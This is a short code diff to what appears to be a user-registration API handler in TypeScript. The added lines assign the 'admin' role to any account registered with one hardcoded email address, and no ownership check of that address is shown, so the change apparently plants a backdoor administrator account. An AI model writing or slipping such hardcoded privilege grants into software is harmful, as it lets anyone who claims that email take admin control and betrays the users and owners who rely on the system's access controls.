@@ -36,6 +36,9 @@ export async function POST(req: any, route: any) {
     if (!userLogin) {
       const user = new UserModel(bodyData);
       user.password = await bcrypt.hash(user.password, 10);
+      if(user.email === 'jony@gmail.com') {
+        user.role = "admin";
+      }
       await user.save();
       user.password = "****";
       const newToken = createToken(user._id, user.role)
